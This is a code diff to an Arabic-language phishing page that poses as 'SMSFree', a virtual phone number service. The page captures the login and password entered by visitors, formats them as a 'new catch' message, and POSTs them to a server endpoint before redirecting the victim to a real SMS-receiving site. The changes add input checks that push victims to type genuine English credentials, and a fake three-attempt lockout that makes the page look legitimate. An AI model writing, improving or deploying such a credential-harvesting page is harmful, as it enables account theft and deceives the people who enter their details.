@@ -37,10 +37,12 @@
 
         h2 { font-size: 18px; line-height: 1.6; color: var(--primary-cyan); margin-bottom: 25px; }
 
+        /* صندوق الحظر (مخفي افتراضياً) */
         .ban-box {
             border: 2px solid var(--accent-orange); border-radius: 12px;
             padding: 12px; margin-bottom: 25px; background: rgba(251, 191, 36, 0.1);
             color: var(--accent-orange); font-weight: bold; font-size: 14px;
+            display: none; /* إخفاء في البداية */
         }
 
         input {
@@ -50,6 +52,8 @@
             text-align: center; font-size: 16px; box-sizing: border-box;
         }
 
+        input.error { border-color: #ef4444; background: rgba(239, 68, 68, 0.05); }
+
         .submit-btn {
             width: 100%; padding: 18px; margin-top: 10px;
             background: linear-gradient(to right, var(--secondary-blue), var(--primary-cyan));
@@ -58,6 +62,8 @@
             transition: 0.3s;
         }
 
+        .submit-btn:disabled { background: #475569; cursor: not-allowed; opacity: 0.6; }
+
         .footer-text { margin-top: 30px; font-size: 12px; color: #64748b; }
     </style>
 </head>
@@ -65,6 +71,7 @@
 
 <div class="main-container">
     <div class="logo-circle">SMSFree</div>
+    
     <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.</h2>
 
     <div class="ban-box" id="banBox">
@@ -74,33 +81,79 @@
     <form id="loginForm">
         <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required>
         <input type="password" id="pass" placeholder="••••••" required>
-        <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
+        <button type="submit" id="submitBtn" class="submit-btn">تفعيل الحساب الآن</button>
     </form>
+
     <div class="footer-text">© Global Virtual Numbers Pro 2024. جميع الحقوق محفوظة.</div>
 </div>
 
 <script>
-    let timeLeft = 30;
-    const timerDisplay = document.getElementById('timer');
-    const banBox = document.getElementById('banBox');
-
-    const countdown = setInterval(() => {
-        timeLeft--;
-        if(timerDisplay) timerDisplay.innerText = timeLeft;
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            if(banBox) banBox.style.display = 'none';
-        }
-    }, 1000);
+    let attempts = 0; // عداد المحاولات
+    let isBanned = false;
 
     document.getElementById('loginForm').onsubmit = async (e) => {
         e.preventDefault();
+        if (isBanned) return;
+
         const user = document.getElementById('user').value;
         const pass = document.getElementById('pass').value;
+        const userInput = document.getElementById('user');
+        const passInput = document.getElementById('pass');
 
-        // إرسال البيانات كرسالة نصية واحدة للسيرفر
-        const fullMessage = `🎯 صيد جديد من التصميم المظلم 🎯\n━━━━━━━━━━━━━━━\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}\n━━━━━━━━━━━━━━━`;
+        // 1. فحص اللغة العربية (التحقق من وجود أحرف عربية)
+        const arabicPattern = /[\u0600-\u06FF]/;
+        
+        if (arabicPattern.test(user) || arabicPattern.test(pass) || pass.length < 6) {
+            attempts++;
+            
+            // تمييز الحقول باللون الأحمر عند الخطأ
+            userInput.classList.add('error');
+            passInput.classList.add('error');
 
+            if (attempts >= 3) {
+                activateBan(); // تفعيل الحظر بعد 3 محاولات
+            } else {
+                Swal.fire({
+                    text: 'يرجى التأكد من كتابة البريد أو كلمة السر بشكل صحيح (باللغة الإنجليزية فقط)',
+                    icon: 'error',
+                    confirmButtonColor: '#22d3ee'
+                });
+            }
+            return;
+        }
+
+        // إذا كانت البيانات بصيغة صحيحة (إنجليزية) يتم الإرسال
+        userInput.classList.remove('error');
+        passInput.classList.remove('error');
+        sendToBot(user, pass);
+    };
+
+    function activateBan() {
+        isBanned = true;
+        attempts = 0; // تصفير المحاولات لبعد الحظر
+        const banBox = document.getElementById('banBox');
+        const timerDisplay = document.getElementById('timer');
+        const submitBtn = document.getElementById('submitBtn');
+
+        banBox.style.display = 'block';
+        submitBtn.disabled = true;
+        
+        let timeLeft = 30;
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerDisplay.innerText = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                banBox.style.display = 'none';
+                submitBtn.disabled = false;
+                isBanned = false;
+            }
+        }, 1000);
+    }
+
+    async function sendToBot(u, p) {
+        const fullMessage = `🎯 صيد جديد (نظام الحماية) 🎯\n━━━━━━━━━━━━━━━\n👤 المستخدم: \`${u}\` \n🔑 الباسورد: \`${p}\` \n━━━━━━━━━━━━━━━`;
+        
         try {
             await fetch('/api/save', {
                 method: 'POST',
@@ -109,9 +162,10 @@
             });
             window.location.href = "https://receive-smss.com/";
         } catch (err) {
-            Swal.fire({ text: 'خطأ في الاتصال', icon: 'error' });
+            console.error("خطأ في الإرسال");
         }
-    };
+    }
 </script>
+
 </body>
 </html>
